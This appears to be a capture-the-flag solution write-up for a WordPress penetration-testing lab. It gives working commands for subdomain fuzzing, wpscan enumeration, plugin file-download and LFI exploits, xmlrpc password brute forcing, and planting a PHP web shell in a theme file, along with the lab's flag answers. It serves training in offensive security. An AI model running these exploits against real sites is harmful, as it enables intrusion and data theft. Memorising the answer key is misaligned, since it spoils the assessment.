# Skills Assessment - WordPress

We have reached the end of the module!

Now let's put all of the new skills we have learned into practice. This final skills assessment will test each of the topics introduced in this module against a new WordPress target.

***

### Scenario

You have been contracted to perform an external penetration test against the company `INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.

Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.

Note: You need to have a knowledge about how in Linux DNS mapping is done when the name server is missing.

**Questions**

Identify the WordPress version number.

```bash
#enumerate where the wordpress is
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://inlanefreight.local -H "HOST: FUZZ.inlanefreight.local" -fs 15189 -t 200
#blog                    [Status: 200, Size: 29308, Words: 2106, Lines: 262, Duration: 2247ms]
wpscan --url http://blog.inlanefreight.local --enumerate --api-token 
#[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
```

Identify the WordPress theme in use.

```bash
#[+] WordPress theme in use: twentynineteen
```

Submit the contents of the flag file in the directory with directory listing enabled.

```bash
http://blog.inlanefreight.local/wp-content/uploads/upload_flag.txt
HTB{d1sabl3_d1r3ct0ry_l1st1ng!}
```

Identify the only non-admin WordPress user. (Format: firstname - lastname)

```bash
[+] Charlie Wiggins
# | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
```

Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.

```bash
#https://www.exploit-db.com/exploits/48698
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
#"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
#"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
```

What is the version number of the plugin vulnerable to an LFI?

```bash
#[+] site-editor
# | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
# | Latest Version: 1.1.1 (up to date)
```

Use the LFI to identify a system user whose name starts with the letter "f".

```bash
#https://www.exploit-db.com/exploits/44340
#** Proof of Concept **
http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
#frank.mclane
```

Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.

```bash
#wpsscan brute force for erika
wpscan --password-attack xmlrpc -t 20 -U erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local 
#[!] Valid Combinations Found:
#| Username: erika, Password: 010203
#now login and go to theme editor 
http://blog.inlanefreight.local/wp-login.php
#choose theme and edit 404 page (i choose theme twentysixteen)
system($_GET['cmd']);
#save it
curl http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php/?cmd=id
#uid=33(www-data) gid=33(www-data) groups=33(www-data)
curl http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php/?cmd=cat+/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
#HTB{w0rdPr355_4SS3ssm3n7}
```
